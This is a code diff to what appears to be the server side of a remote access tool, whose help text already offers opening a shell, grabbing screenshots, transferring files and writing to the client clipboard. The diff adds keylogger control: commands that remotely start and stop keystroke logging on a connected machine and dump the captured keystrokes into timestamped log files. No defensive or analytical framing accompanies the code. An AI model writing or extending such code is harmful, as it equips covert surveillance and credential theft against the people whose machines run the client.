@@ -24,6 +24,7 @@ interface_help = """
 --e | Open a shell
 --g | Grabs a screenshot
 --u | User Info
+--k (start) (stop) (dump) | Manage Keylogger
 --s (file) | Transfers file to Client
 --r (file) | Transfers file to Server
 --c (Text) | Copies to Client Clipboard
@@ -357,6 +358,25 @@ class MultiServer(object):
                 print('IP : {}\nPort: {}\nPC Name: {}'.format(info[0], info[1], info[2]))
                 self.receive(conn)
                 continue
+            if command[:3] == '--k':
+                if command[4:].strip() == 'start':
+                    self.send(conn, b'<STARTLOGGER>')
+                    self.receive(conn)
+                    continue
+                if command[4:].strip() == 'stop':
+                    self.send(conn, b'<STOPLOGGER>')
+                    self.receive(conn)
+                    continue
+                if command[4:].strip() == 'dump':
+                    self.send(conn, b'<DUMP>')
+                    data = self.receive(conn, _print=False)
+                    if data == b'<NOTRUNNING>':
+                        print('Keylogger not running\n')
+                        continue
+                    with open('{}.log'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
+                        f.write(data)
+                    print('Logs saved')
+                    continue
             if '--p' in command:
                 self.send(conn, b'<PASTE>')
                 self.receive(conn)
